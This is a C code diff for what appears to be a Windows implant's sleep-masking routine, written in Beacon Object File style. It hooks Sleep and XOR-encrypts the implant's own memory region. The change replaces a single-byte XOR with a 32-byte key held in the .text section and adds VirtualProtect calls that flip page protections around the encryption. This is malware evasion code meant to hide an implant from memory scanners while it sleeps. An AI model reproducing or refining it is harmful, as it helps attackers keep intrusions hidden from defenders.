@@ -2,19 +2,23 @@
 #include "../tcg.h"
 
 WINBASEAPI SIZE_T WINAPI KERNEL32$VirtualQuery(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
+WINBASEAPI BOOL WINAPI KERNEL32$VirtualProtect (LPVOID, SIZE_T, DWORD, PDWORD);
 WINBASEAPI LPVOID WINAPI KERNEL32$GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
 WINBASEAPI VOID WINAPI KERNEL32$Sleep(DWORD dwMilliseconds);
 WINBASEAPI NTSTATUS NTAPI NTDLL$NtWaitForSingleObject(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
 
+char SLEEPMASK_KEY[32] __attribute__((section(".text")));
+
 void xor_region(MEMORY_BASIC_INFORMATION *meminfo) {
-	dprintf("Performing XOR operation!");
-	
-	//TODO check memory protection
+	DWORD oldProt = 0;
+	KERNEL32$VirtualProtect(meminfo->AllocationBase, meminfo->RegionSize, PAGE_READWRITE, &oldProt);
 	
 	char *ptr = (char *) meminfo->AllocationBase;
 	for(int i = 0; i < meminfo->RegionSize; i++) {
-		ptr[i] = ptr[i] ^ 0xAB; // TODO use a long randomly generated key
+		ptr[i] = ptr[i] ^ SLEEPMASK_KEY[i % 32];
 	}
+	
+	KERNEL32$VirtualProtect(meminfo->AllocationBase, meminfo->RegionSize, oldProt, &oldProt);
 }
 
 WINBASEAPI VOID WINAPI _Sleep(DWORD dwMilliseconds) {
